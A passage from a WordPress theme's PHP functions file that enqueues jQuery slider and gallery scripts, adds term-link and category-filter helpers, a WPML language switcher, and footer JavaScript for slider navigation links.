								wp_register_script('flexslider', $jscriptURL.'flexslider/jquery.flexslider-min.js', array('jquery'), '2.0', false);
								wp_register_script('isotope', $jscriptURL.'jquery.isotope.min.js',array('jquery'), '1.5.19', false);							
								wp_register_script('custom',$jscriptURL.'custom.js', array('jquery'), '1.2', true);
								
								
								// Enqueuing Scripts that are needed all the pages
								wp_enqueue_script('jquery');
								wp_enqueue_script('jquery-ui-core');
								wp_enqueue_script('jquery-ui-datepicker');
								wp_enqueue_script('prettyphoto');
								wp_enqueue_script('validate');
								wp_enqueue_script('forms');
                                wp_enqueue_script('cycle2');
                                wp_enqueue_script('easing');

								// load cycle plugin, easing plugin and flex slider files for specific pages
								if( is_page_template('template-home.php') || is_page_template('template-home-demo.php') || is_page_template('template-home-with-sidebar.php') || is_page_template('template-home-with-blog-posts.php') || is_singular('gallery-item')  )
								{
                                    wp_enqueue_script('flexslider');
								}								
								
								// load Isotope for gallery pages
		    					if( is_page_template( 'template-4-columns-gallery.php' || 'template-3-columns-gallery.php' || 'template-2-columns-gallery.php') ) 
								{
		    	    				wp_enqueue_script('isotope');
		    					}
								
								wp_enqueue_script('custom');

                                // Responsive Navigation Title Translation Support - Ref : http://codex.wordpress.org/Function_Reference/wp_localize_script
                                $localized_array = array(
                                                    'nav_title' => __('Go to...','framework'),
                                                    'wrong_code' => __("Wrong Code!", 'framework')
                                                    );

                                wp_localize_script( 'custom', 'localized', $localized_array );
								
								
						}
				}
		}
		add_action('wp_enqueue_scripts', 'load_theme_scripts');		
		
		
/*-----------------------------------------------------------------------------------*/
/*	Get first Term with link
/*-----------------------------------------------------------------------------------*/	

	function get_first_term_with_link( $post_id, $taxonomy)
	{
		$link = '';		
		$terms = get_the_terms( $post_id, $taxonomy );					
		if ( $terms && ! is_wp_error( $terms ) ) :
			foreach ( $terms as $term ) 
			{				
				$link = '<a href="'.get_term_link($term->slug, $taxonomy).'">'.$term->name.'</a>';
				break;
			}			
			return $link;										
		endif; 
		
		return $link;
	}	
	

/*-----------------------------------------------------------------------------------*/
/*	Remove rel attribute from the category list
/*-----------------------------------------------------------------------------------*/	
	function remove_category_list_rel($output)
	{
		$output = str_replace(' rel="category tag"', '', $output);
		return $output;
	}
	add_filter('wp_list_categories', 'remove_category_list_rel');
	add_filter('the_category', 'remove_category_list_rel');



/*-----------------------------------------------------------------------------------*/
/*	WPML Custom Language Switcher Function
/*-----------------------------------------------------------------------------------*/
    if(!function_exists('language_selector_flags')){

        function language_selector_flags(){
            $languages = icl_get_languages('skip_missing=0&orderby=code');
            if(!empty($languages)){
                echo '<div id="custom-lang-switcher">';
                foreach($languages as $l){
                    if($l['country_flag_url']){
                        if(!$l['active']) echo '<a href="'.$l['url'].'">';
                        echo '<img src="'.$l['country_flag_url'].'" height="12" alt="'.$l['language_code'].'" width="18" />';
                        if(!$l['active']) echo '</a>';
                    }
                    if(!$l['active']) echo '<a href="'.$l['url'].'">';
                    echo $l['native_name'];
                    if(!$l['active']) echo '</a>';
                }
                echo '</div>';
            }
        }

    }



/*-----------------------------------------------------------------------------------*/
/*	Generate Dynamic JavaScript
/*-----------------------------------------------------------------------------------*/
    if(!function_exists('generate_dynamic_javascript')){
        function generate_dynamic_javascript(){

            /* Generate JavaScript to Enable Flex Slider Navigation Tabs to Go to Their Linked Pages */

            /* this JS will be generated for only home page templates */
            if( is_page_template('template-home.php') || is_page_template('template-home-with-sidebar.php') || is_page_template('template-home-with-blog-posts.php') ){

                /* check if related theme option is enabled */
                $enable_flex_slider_nav_links = get_option('theme_enable_flex_slider_nav_links');
                if($enable_flex_slider_nav_links == 'true')
                {
                    /* Generate */
                    ?>
                    <script type="text/javascript">
                        jQuery(document).ready(function(){
                            $ = jQuery;
                            $('.slide-nav li').on('click',function(){
                                var position = $(this).index();
                                var target = $('.slides li').eq(position).find('a').attr('href');
                                window.location.assign(target);
                            });
                        });
                    </script>
                    <?php
                }
            }
        }
    }

    /* Attach dynamic javascript generation function with wp_footer action hook */
    add_action('wp_footer', 'generate_dynamic_javascript');